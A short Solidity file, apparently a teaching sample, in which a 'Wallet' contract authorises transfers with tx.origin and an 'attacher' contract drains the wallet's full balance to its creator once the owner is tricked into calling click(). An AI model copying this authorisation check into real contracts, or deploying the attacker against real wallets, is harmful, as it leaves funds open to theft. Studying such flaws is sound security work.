// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Wallet {

    address public owner;

    constructor()  {
        owner=msg.sender;
    }

    function deposite() public payable {}

    function transfer(address payable to,uint amount)public {
        require(tx.origin==owner,"caller is not owner");
        (bool sent,)=to.call{value:amount}("");
        require(sent,"transaction is failed");
    }

    function balance() public view returns(uint){
        return address(this).balance;
    }

}

contract attacher{
    address payable public owner ;
    Wallet wallet;

    constructor(Wallet _wallet){
        wallet=Wallet(_wallet);
        owner=payable(msg.sender);
    }
    function click() public {
        wallet.transfer(owner, address(wallet).balance);
    }

}